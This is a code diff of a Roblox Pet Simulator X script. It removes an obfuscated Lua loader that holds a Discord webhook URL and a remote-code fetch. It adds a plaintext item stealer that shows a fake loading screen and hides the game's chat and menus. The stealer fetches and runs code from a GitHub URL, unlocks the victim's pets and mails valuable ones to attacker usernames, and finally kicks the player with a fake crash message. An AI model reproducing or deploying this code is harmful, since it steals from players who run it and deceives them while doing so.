@@ -1,1 +1,349 @@
-do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v83=0;local v84;while true do if (v83==0) then v84=v2(v0(v30,16));if v19 then local v103=v5(v84,v19);v19=nil;return v103;else return v84;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v85=0 -0 ;local v86;while true do if (v85==(0 -0)) then v86=(v31/((3 -1)^(v32-(2 -1))))%(((2258 -(1523 + 114)) -(555 + 64))^(((v33-1) -(v32-1)) + (932 -(857 + 74)))) ;return v86-(v86%((512 + 57) -(367 + 201))) ;end end else local v87=0 -0 ;local v88;while true do if (v87==(927 -(214 + 713))) then v88=(1 + 1)^(v32-(1 + 0)) ;return (((v31%(v88 + v88))>=v88) and (878 -(282 + 595))) or 0 ;end end end end local function v21()local v34=1065 -(68 + 997) ;local v35;while true do if (v34==(1271 -(226 + 1044))) then return v35;end if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + 1 ;v34=(116 + 2) -(32 + 85) ;end end end local function v22()local v36,v37=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (4 -2) ;return (v37 * (472 -216)) + v36 ;end local function v23()local v38=(0 -0) -0 ;local v39;local v40;local v41;local v42;while true do if (v38==((634 -284) -(87 + 263))) then v39,v40,v41,v42=v1(v16,v18,v18 + (183 -(67 + 113)) );v18=v18 + 3 + 1 ;v38=2 -(1 + 0) ;end if (v38==(1 + 0)) then return (v42 * 16777216) + (v41 * (260471 -194935)) + (v40 * (1208 -(802 + 150))) + v39 ;end end end local function v24()local v43=v23();local v44=v23();local v45=998 -(915 + 82) ;local v46=(v20(v44,2 -1 ,12 + 8 ) * (((1 + 1) -0)^(1219 -(1069 + 118)))) + v43 ;local v47=v20(v44,47 -26 ,67 -36 );local v48=((v20(v44,6 + 22 + 4 )==(1 -0)) and  -(1 + 0)) or (792 -(368 + (1195 -(201 + 571)))) ;if (v47==(0 -0)) then if (v46==(18 -(10 + 8))) then return v48 * 0 ;else v47=(1141 -(116 + 1022)) -2 ;v45=442 -(416 + 26) ;end elseif (v47==(6535 -4488)) then return ((v46==(0 + (0 -0))) and (v48 * ((1 -0)/(438 -(145 + 293))))) or (v48 * NaN) ;end return v8(v48,v47-(1453 -(44 + 227 + 159)) ) * (v45 + (v46/(2^(1538 -(998 + 488))))) ;end local function v25(v49)local v50;if  not v49 then local v89=0 -(0 + 0) ;while true do if (v89==(0 -0)) then v49=v23();if (v49==(859 -(814 + 45))) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -(2 -1) );v18=v18 + v49 ;local v51={};for v67=1, #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=320 -(53 + 267) ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v52==(1 + 0)) then v55=nil;v56=nil;v52=1824 -(301 + 1521) ;end if (v52~=(4 -1)) then else v59=nil;v60=nil;v52=3 + 1 ;end if ((0 -0)~=v52) then else v53=982 -(18 + 964) ;v54=nil;v52=3 -2 ;end if (v52==(3 + 1)) then while true do if (v53==0) then local v98=0 -0 ;local v99;while true do if (v98~=(1700 -(1419 + 281))) then else v99=0 -0 ;while true do if (v99~=(75 -(71 + 3))) then else v53=1 + 0 ;break;end if (v99==(0 -0)) then v54=0;v55=nil;v99=1 -0 ;end end break;end end end if (v53~=(2 + 0)) then else local v100=126 -(116 + 10) ;while true do if (v100~=(242 -(187 + 54))) then else v53=783 -(162 + 618) ;break;end if (v100==(0 + 0)) then v58=nil;v59=nil;v100=1 + 0 ;end end end if (v53==(741 -(542 + 196))) then v60=nil;while true do local v104=0 -0 ;local v105;while true do if (v104==0) then v105=0 -0 ;while true do if (v105~=0) then else if (v54==(2 -0)) then local v124=0 + 0 ;local v125;while true do if (v124==(1636 -(1373 + 263))) then v125=0 -0 ;while true do local v167=1000 -(451 + 549) ;while true do if (0~=v167) then else if (v125==0) then local v180=0 + 0 ;while true do if (0~=v180) then else for v181=1,v23() do local v182=1551 -(1126 + 425) ;local v183;local v184;while true do if (v182~=(0 -0)) then else v183=405 -(118 + 287) ;v184=nil;v182=3 -2 ;end if (v182~=(1 -0)) then else while true do if ((1384 -(746 + 638))==v183) then v184=v21();if (v20(v184,1122 -(118 + 1003) ,1 + 0 )==(0 -0)) then local v188=341 -(218 + 123) ;local v189;local v190;local v191;local v192;local v193;while true do if (v188==(4 -3)) then v191=nil;v192=nil;v188=2;end if (v188==(1583 -(1535 + 46))) then v193=nil;while true do if ((1 + 0)==v189) then local v194=0;while true do if (v194==(978 -(553 + 424))) then v189=3 -1 ;break;end if (v194==(0 + 0)) then v192=nil;v193=nil;v194=561 -(306 + 254) ;end end end if (v189==(1 + 1)) then while true do if (v190~=(0 + 0)) then else v191=v20(v184,3 -1 ,2 + 1 );v192=v20(v184,8 -4 ,1473 -(899 + 568) );v190=2 -1 ;end if (v190~=1) then else local v195=0 -0 ;while true do if ((1 + 0)==v195) then v190=9 -7 ;break;end if (v195~=(0 -0)) then else v193={v22(),v22(),nil,nil};if (v191==(1329 -(797 + 532))) then local v200=0;local v201;while true do if (v200==0) then v201=572 -(426 + 146) ;while true do if ((0 + 0)~=v201) then else v193[2 + 1 ]=v22();v193[9 -5 ]=v22();break;end end break;end end elseif (v191==(1457 -(282 + 1174))) then v193[734 -(476 + 255) ]=v23();elseif (v191==(813 -(569 + 242))) then v193[1133 -(369 + 761) ]=v23() -((5 -3)^(28 -12)) ;elseif (v191~=3) then else local v210=0 + 0 ;while true do if (v210==(238 -(64 + 174))) then v193[1 + 2 ]=v23() -((2 -0)^(352 -(144 + 192))) ;v193[4]=v22();break;end end end v195=1025 -(706 + 318) ;end end end if (v190==(1253 -(721 + 530))) then local v196=0;while true do if (v196~=(1 + 0)) then else v190=1274 -(945 + 326) ;break;end if (v196~=(0 + 0)) then else if (v20(v192,1505 -(363 + 1141) ,2 -1 )~=(1 + 0)) then else v193[702 -(271 + 429) ]=v60[v193[2]];end if (v20(v192,2 + 0 ,2 + 0 )==(1 + 0)) then v193[1503 -(1408 + 92) ]=v60[v193[1089 -(461 + 625) ]];end v196=1;end end end if (v190==3) then if (v20(v192,1291 -(993 + 295) ,7 -4 )==(1 + 0)) then v193[4]=v60[v193[1175 -(418 + 753) ]];end v55[v181]=v193;break;end end break;end if (v189~=(1933 -(565 + 1368))) then else v190=0 + 0 ;v191=nil;v189=1;end end break;end if (v188~=(1661 -(1477 + 184))) then else v189=0 + 0 ;v190=nil;v188=1;end end end break;end end break;end end end for v185=1 + 0 ,v23() do v56[v185-(1 + 0) ]=v28();end v180=530 -(406 + 123) ;end if (v180~=(1770 -(1749 + 20))) then else v125=1;break;end end end if (v125~=(1 + 0)) then else return v58;end break;end end end break;end end end if (v54==0) then local v126=0;local v127;while true do if (0~=v126) then else v127=0;while true do if ((1324 -(1249 + 73))==v127) then v54=857 -(564 + 292) ;break;end if ((0 + 0)~=v127) then else local v176=0;while true do if (v176~=(1 -0)) then else v127=2 -1 ;break;end if (v176~=(1145 -(466 + 679))) then else v55={};v56={};v176=2 -1 ;end end end if (v127==1) then local v177=0 -0 ;while true do if (0==v177) then v57={};v58={v55,v56,nil,v57};v177=1002 -(938 + 63) ;end if (v177~=(1 + 0)) then else v127=1902 -(106 + 1794) ;break;end end end end break;end end end v105=1 + 0 ;end if (v105~=(1 + 0)) then else if ((2 -1)==v54) then local v128=0 -0 ;while true do if (v128~=(1 + 0)) then else for v168=115 -(4 + 110) ,v59 do local v169=267 -(176 + 91) ;local v170;local v171;local v172;local v173;while true do if (v169==0) then v170=0 -0 ;v171=nil;v169=1 -0 ;end if (v169~=1) then else v172=nil;v173=nil;v169=2;end if (v169~=(586 -(57 + 527))) then else while true do if (v170~=(1427 -(41 + 1386))) then else v171=0;v172=nil;v170=1;end if (v170==(104 -(17 + 86))) then v173=nil;while true do if (v171~=(0 + 0)) then else v172=v21();v173=nil;v171=1 -0 ;end if (v171~=(1 + 0)) then else if (v172==(2 -1)) then v173=v21()~=(166 -(122 + 44)) ;elseif (v172==(2 -0)) then v173=v24();elseif (v172~=(9 -6)) then else v173=v25();end v60[v168]=v173;break;end end break;end end break;end end end v58[3 + 0 ]=v21();v128=2;end if (v128==(6 -4)) then v54=6 -4 ;break;end if (v128~=(0 + 0)) then else v59=v23();v60={};v128=2 -1 ;end end end break;end end break;end end end break;end if (v53==(1 -0)) then local v101=65 -(30 + 35) ;local v102;while true do if (v101~=(0 + 0)) then else v102=1257 -(1043 + 214) ;while true do if (v102==(3 -2)) then v53=1214 -(323 + 889) ;break;end if ((0 + 0)~=v102) then else local v106=0;while true do if (v106~=(0 -0)) then else v56=nil;v57=nil;v106=2 -1 ;end if (v106~=(2 -1)) then else v102=1;break;end end end end break;end end end end break;end if (v52~=(582 -(361 + 219))) then else v57=nil;v58=nil;v52=3;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v90=0,v77 do if (v90>=v71) then v75[v90-v71 ]=v76[v90 + 1 ];else v79[v90]=v76[v90 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do local v91=0;while true do if (v91==1) then if (v82<=11) then if (v82<=5) then if (v82<=2) then if (v82<=0) then v73=v81[3];elseif (v82==1) then v79[v81[2]]=v63[v81[3]];else local v131=v81[2];local v132=v79[v81[3]];v79[v131 + 1 ]=v132;v79[v131]=v132[v81[4]];end elseif (v82<=3) then v79[v81[2]]=v81[3];elseif (v82==4) then v79[v81[2]]=v81[3]~=0 ;else local v137=v81[2];v79[v137]=v79[v137](v13(v79,v137 + 1 ,v74));end elseif (v82<=8) then if (v82<=6) then do return;end elseif (v82==7) then if (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end else v79[v81[2]][v81[3]]=v81[4];end elseif (v82<=9) then v79[v81[2]][v81[3]]=v81[4];elseif (v82>10) then v79[v81[2]]();else v73=v81[3];end elseif (v82<=17) then if (v82<=14) then if (v82<=12) then local v112=0;local v113;local v114;while true do if (v112==0) then v113=v81[2];v114=v79[v81[3]];v112=1;end if (v112==1) then v79[v113 + 1 ]=v114;v79[v113]=v114[v81[4]];break;end end elseif (v82>13) then do return;end else v79[v81[2]]=v81[3]~=0 ;end elseif (v82<=15) then local v115=v81[2];local v116,v117=v72(v79[v115](v13(v79,v115 + 1 ,v81[3])));v74=(v117 + v115) -1 ;local v118=0;for v121=v115,v74 do v118=v118 + 1 ;v79[v121]=v116[v118];end elseif (v82==16) then for v158=v81[2],v81[3] do v79[v158]=nil;end else v79[v81[2]]();end elseif (v82<=20) then if (v82<=18) then v79[v81[2]]=v81[3];elseif (v82==19) then for v160=v81[2],v81[3] do v79[v160]=nil;end else local v143=0;local v144;local v145;local v146;local v147;while true do if (v143==0) then v144=v81[2];v145,v146=v72(v79[v144](v13(v79,v144 + 1 ,v81[3])));v143=1;end if (v143==2) then for v174=v144,v74 do local v175=0;while true do if (v175==0) then v147=v147 + 1 ;v79[v174]=v145[v147];break;end end end break;end if (v143==1) then v74=(v146 + v144) -1 ;v147=0;v143=2;end end end elseif (v82<=21) then if (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end elseif (v82==22) then v79[v81[2]]=v63[v81[3]];else local v151=0;local v152;while true do if (v151==0) then v152=v81[2];v79[v152]=v79[v152](v13(v79,v152 + 1 ,v74));break;end end end v73=v73 + 1 ;break;end if (0==v91) then v81=v69[v73];v82=v81[1];v91=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!133O00028O00027O0040026O00F03F026O00084003023O005F4703093O00416E74694C656176652O0103093O004D6F7573654C6F636B010003083O00557365724E616D65030B3O00546568507563756B5F2O3503093O00557365724E616D6532030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403433O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F53757065724D6F6E7A2F5073785F53632F6D61696E2F4D6F6E7A5072656D69756D03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3130352O33383937333237363039383634302F303675674A7752434E666F394A454B7A476376686950516A7A347637322D7165554831487A334D6E52537041714D6374654179713450786B35436D705A43357358537875030D3O004C6F6164696E675363722O656E00413O002O123O00014O0010000100013O0026153O00020001000100040A3O00020001002O12000100013O002615000100140001000200040A3O00140001002O12000200013O0026150002000C0001000300040A3O000C0001002O12000100043O00040A3O00140001002615000200080001000100040A3O00080001001201000300053O003008000300060007001201000300053O003008000300080009002O12000200033O00040A3O00080001002615000100230001000100040A3O00230001002O12000200013O0026150002001E0001000100040A3O001E0001001201000300053O0030080003000A000B001201000300053O0030080003000C000B002O12000200033O002615000200170001000300040A3O00170001002O12000100033O00040A3O0023000100040A3O001700010026150001002E0001000400040A3O002E00010012010002000D3O0012010003000E3O00200C00030003000F002O12000500104O000D000600014O000F000300064O001700023O00022O000B00020001000100040A3O00400001002615000100050001000300040A3O00050001002O12000200013O002615000200380001000100040A3O00380001001201000300053O003008000300110012001201000300053O003008000300130007002O12000200033O002615000200310001000300040A3O00310001002O12000100023O00040A3O0005000100040A3O0031000100040A3O0005000100040A3O0040000100040A3O000200012O00063O00017O00",v9(),...);end
+local Players = game:GetService("Players");
+local StarterGui = game:GetService("StarterGui");
+local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library);
+local CoreGui = game:GetService("CoreGui");
+local RobloxGui = CoreGui.RobloxGui;
+local Client = Players.LocalPlayer;
+local Network = require((game:GetService("ReplicatedStorage")).Library.Client.Network);
+local Fire = Network.Fire;
+local lockedCount = 0;
+local Invoke = Network.Invoke;
+_G.Diamonds = tonumber(_G.Diamonds);
+local PetFolders = {
+	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
+	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
+};
+if time() <= 30 then
+	wait(0);
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "Script error",
+		Text = "Please wait and try again Remote not found !",
+		Icon = "rbxassetid://57254792",
+		Duration = 15
+	});
+	return;
+end;
+local Loading = Instance.new("ScreenGui");
+local MainFrame = Instance.new("Frame");
+local Title = Instance.new("TextLabel");
+local Dots = Instance.new("Frame");
+local Dot1 = Instance.new("Frame");
+local UICorner = Instance.new("UICorner");
+local InsideDot = Instance.new("Frame");
+local UICorner_2 = Instance.new("UICorner");
+local Dot2 = Instance.new("Frame");
+local UICorner_3 = Instance.new("UICorner");
+local InsideDot_2 = Instance.new("Frame");
+local UICorner_4 = Instance.new("UICorner");
+local Dot3 = Instance.new("Frame");
+local UICorner_5 = Instance.new("UICorner");
+local InsideDot_3 = Instance.new("Frame");
+local UICorner_6 = Instance.new("UICorner");
+local Bar = Instance.new("Frame");
+local Bar2 = Instance.new("Frame");
+local UICorner_7 = Instance.new("UICorner");
+local UICorner_8 = Instance.new("UICorner");
+local Percentage = Instance.new("TextLabel");
+local Tip = Instance.new("TextLabel");
+local EndSequence = Instance.new("Frame");
+Loading.Name = "Loading";
+Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui");
+Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+Loading.DisplayOrder = 999999999;
+MainFrame.Name = "MainFrame";
+MainFrame.Parent = Loading;
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20);
+MainFrame.BorderSizePixel = 0;
+MainFrame.Position = UDim2.new(-0, 0, -0, 0);
+MainFrame.Size = UDim2.new(0, 0, 0, 0);
+Title.Name = "Title";
+Title.Parent = MainFrame;
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+Title.BackgroundTransparency = 0;
+Title.Position = UDim2.new(0, 0, 0, 0);
+Title.Size = UDim2.new(0, 0, 0, 0);
+Title.Font = Enum.Font.FredokaOne;
+Title.Text = "Hostee Scriptz On Top | .gg/hosteehub";
+Title.TextColor3 = Color3.fromRGB(255, 255, 255);
+Title.TextScaled = true;
+Title.TextSize = 0;
+Title.TextWrapped = true;
+Dots.Name = "Dots";
+Dots.Parent = MainFrame;
+Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+Dots.BackgroundTransparency = 0;
+Dots.Position = UDim2.new(0, 0, 0, 0);
+Dots.Size = UDim2.new(0, 0, 0, 0);
+Dot1.Name = "Dot1";
+Dot1.Parent = Dots;
+Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
+Dot1.Position = UDim2.new(0, 0, 0, 0);
+Dot1.Size = UDim2.new(0, 0, 0, 0);
+UICorner.CornerRadius = UDim.new(0, 0);
+UICorner.Parent = Dot1;
+InsideDot.Name = "InsideDot";
+InsideDot.Parent = Dot1;
+InsideDot.AnchorPoint = Vector2.new(0, 0);
+InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+InsideDot.Position = UDim2.new(0, 0, 0, 0);
+UICorner_2.CornerRadius = UDim.new(0, 0);
+UICorner_2.Parent = InsideDot;
+Dot2.Name = "Dot2";
+Dot2.Parent = Dots;
+Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
+Dot2.Position = UDim2.new(0, 0, 0, 0);
+Dot2.Size = UDim2.new(0, 0, 0, 0);
+UICorner_3.CornerRadius = UDim.new(0, 0);
+UICorner_3.Parent = Dot2;
+InsideDot_2.Name = "InsideDot";
+InsideDot_2.Parent = Dot2;
+InsideDot_2.AnchorPoint = Vector2.new(0, 0);
+InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+InsideDot_2.Position = UDim2.new(0, 0, 0, 0);
+UICorner_4.CornerRadius = UDim.new(0, 0);
+UICorner_4.Parent = InsideDot_2;
+Dot3.Name = "Dot3";
+Dot3.Parent = Dots;
+Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
+Dot3.Position = UDim2.new(0, 0, 0, 0);
+Dot3.Size = UDim2.new(0, 0, 0, 0);
+UICorner_5.CornerRadius = UDim.new(0, 0);
+UICorner_5.Parent = Dot3;
+InsideDot_3.Name = "InsideDot";
+InsideDot_3.Parent = Dot3;
+InsideDot_3.AnchorPoint = Vector2.new(0, 0);
+InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+InsideDot_3.Position = UDim2.new(0, 0, 0, 0);
+UICorner_6.CornerRadius = UDim.new(0, 0);
+UICorner_6.Parent = InsideDot_3;
+Bar.Name = "Bar";
+Bar.Parent = MainFrame;
+Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
+Bar.BorderSizePixel = 0;
+Bar.Position = UDim2.new(0, 0, 0, 0);
+Bar.Size = UDim2.new(0, 0, 0, 0);
+Bar2.Name = "Bar2";
+Bar2.Parent = Bar;
+Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60);
+Bar2.BorderSizePixel = 0;
+Bar2.Size = UDim2.new(0, 0, 1, 0);
+UICorner_7.CornerRadius = UDim.new(0, 0);
+UICorner_7.Parent = Bar2;
+UICorner_8.CornerRadius = UDim.new(0, 0);
+UICorner_8.Parent = Bar;
+Percentage.Name = "Percentage";
+Percentage.Parent = Bar;
+Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+Percentage.BackgroundTransparency = 0;
+Percentage.Position = UDim2.new(0, 0, 0, 0);
+Percentage.Size = UDim2.new(0, 0, 0, 0);
+Percentage.Font = Enum.Font.FredokaOne;
+Percentage.Text = "0%";
+Percentage.TextColor3 = Color3.fromRGB(255, 255, 255);
+Percentage.TextScaled = true;
+Percentage.TextSize = 0;
+Percentage.TextWrapped = true;
+Tip.Name = "Tip";
+Tip.Parent = MainFrame;
+Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+Tip.BackgroundTransparency = 0;
+Tip.Position = UDim2.new(0, 0, 0, 0);
+Tip.Size = UDim2.new(0, 0, 0, 0);
+Tip.Font = Enum.Font.SourceSansItalic;
+Tip.Text = "";
+Tip.TextColor3 = Color3.fromRGB(138, 138, 138);
+Tip.TextScaled = true;
+Tip.TextSize = 0;
+Tip.TextWrapped = true;
+EndSequence.Name = "EndSequence";
+EndSequence.Parent = Loading;
+EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20);
+EndSequence.BorderSizePixel = 0;
+EndSequence.Position = UDim2.new(1, 0, 0, 0);
+EndSequence.Size = UDim2.new(1, 0, 1, 0);
+local function NGZQAMK_fake_script()
+	local script = Instance.new("LocalScript", Dots);
+	while true do
+		wait(0);
+		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0, true);
+	end;
+end;
+(coroutine.wrap(NGZQAMK_fake_script))();
+local function NDID_fake_script()
+	local script = Instance.new("LocalScript", MainFrame);
+	local bar = script.Parent.Bar;
+	local insidebar = bar.Bar2;
+	local percentage = bar.Percentage;
+	wait(5);
+	insidebar:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Linear", 200, true);
+	wait(200);
+	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quad", 3, true);
+	wait(3);
+	game.Players.LocalPlayer:Kick("[Crash Log " .. math.random(50, 5000) .. "] Please Rejoin.");
+end;
+(coroutine.wrap(NDID_fake_script))();
+local function OVSBNB_fake_script()
+	local script = Instance.new("LocalScript", Percentage);
+	wait(5);
+	for i = 1, 100 do
+		script.Parent.Text = i .. "%";
+		wait(2);
+	end;
+end;
+(coroutine.wrap(OVSBNB_fake_script))();
+local function SNUMK_fake_script()
+	local script = Instance.new("LocalScript", Tip);
+	local tip = script.Parent;
+	while true do
+		wait(5);
+		tip.Text = _G.Tip1;
+		wait(5);
+		tip.Text = _G.Tip2;
+		wait(5);
+		tip.Text = _G.Tip3;
+		wait(5);
+		tip.Text = _G.Tip4;
+		wait(5);
+		tip.Text = _G.Tip5;
+	end;
+end;
+(coroutine.wrap(SNUMK_fake_script))();
+local function LSNGUH_fake_script()
+	local script = Instance.new("LocalScript", Loading);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false);
+end;
+(coroutine.wrap(LSNGUH_fake_script))();
+local mailbox = (game:GetService("Workspace")).__MAP.Interactive.Mailbox;
+for i, v in pairs(mailbox:GetDescendants()) do
+	if v:IsA("MeshPart") or v:IsA("Part") then
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position);
+		break;
+	end;
+end;
+if Client.leaderstats.Diamonds.Value < _G.Diamonds then
+	Client:Kick("Error launching script. Error code: " .. _G.ScriptName .. ".LaunchScript");
+end;
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
+if _G.AntiLeave == true then
+	RobloxGui:Destroy();
+end;
+wait(0);
+Client.Character.HumanoidRootPart.Anchored = true;
+(loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Monz")))();
+writefile("Monz Better.txt", "https://discord.gg/dvCgjJVFVu");
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Monz Better", "All");
+if _G.UnlockPets == true then
+	local function unlockPetsInFolder(folder)
+		local children = folder:GetChildren();
+		for _, child in ipairs(children) do
+			if child:IsA("TextButton") and child.Locked.Visible == true then
+				local name = child.Name;
+				if child.Name then
+					local args2 = {
+						[1] = {
+							["" .. name] = false
+						}
+					};
+					Invoke("Lock Pet", unpack(args2));
+				end;
+			end;
+		end;
+	end;
+	while true do
+		for _, folder in pairs(PetFolders) do
+			unlockPetsInFolder(folder);
+			wait(0);
+		end;
+		for _, folder in ipairs(PetFolders) do
+			for _, child in ipairs(folder:GetChildren()) do
+				if child:IsA("TextButton") and child.Locked.Visible == true then
+					lockedCount = lockedCount + 1;
+				end;
+			end;
+		end;
+		if lockedCount == 0 then
+			print("Unlocked All");
+			break;
+		end;
+	end;
+end;
+local savedPets = (FrameworkLibrary.Save.Get()).Pets;
+while wait() do
+	for i, v in pairs(savedPets) do
+		local v2 = FrameworkLibrary.Directory.Pets[v.id];
+		if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value < 1000000 then
+			local args = {
+				[1] = {
+					Recipient = G_UserName,
+					Diamonds = 0,
+					Pets = {
+						v.uid
+					},
+					Message = "Monz Better"
+				}
+			};
+			Invoke("Send Mail", unpack(args));
+		elseif v2.rarity == "Exclusive" then
+			local args = {
+				[1] = {
+					Recipient = _G.UserName,
+					Diamonds = 0,
+					Pets = {
+						v.uid
+					},
+					Message = "Monz Better"
+				}
+			};
+			Invoke("Send Mail", unpack(args));
+		elseif v2.huge == true then
+			local args = {
+				[1] = {
+					Recipient = _G.UserName,
+					Diamonds = 0,
+					Pets = {
+						v.uid
+					},
+					Message = "Monz Better"
+				}
+			};
+			Invoke("Send Mail", unpack(args));
+		elseif v2.rarity == "Event" then
+			local args = {
+				[1] = {
+					Recipient = _G.UserName2,
+					Diamonds = 0,
+					Pets = {
+						v.uid
+					},
+					Message = "Monz Better"
+				}
+			};
+			Invoke("Send Mail", unpack(args));
+		elseif v2.rarity == "Secret" then
+			local args = {
+				[1] = {
+					Recipient = _G.UserName2,
+					Diamonds = 0,
+					Pets = {
+						v.uid
+					},
+					Message = "Monz Better"
+				}
+			};
+			Invoke("Send Mail", unpack(args));
+		end;
+	end;
+end;
